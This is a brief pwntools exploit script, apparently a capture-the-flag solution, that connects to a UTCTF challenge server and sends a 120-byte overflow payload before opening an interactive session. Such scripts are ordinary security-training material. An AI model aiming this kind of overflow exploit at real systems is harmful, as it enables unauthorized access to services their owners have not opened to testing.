#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch = 'i386')
exe = './AAAAAAAAAAAAAAAA'

host = args.HOST or 'pwn.utctf.live'
port = int(args.PORT or 5000)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def local(argv = [], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv = [], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript = gdbscript)
    return io

def start(argv = [], *a, **kw):
    '''Start the exploit against the target'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

payload = b'B' * 120
io.sendline(payload)

io.interactive()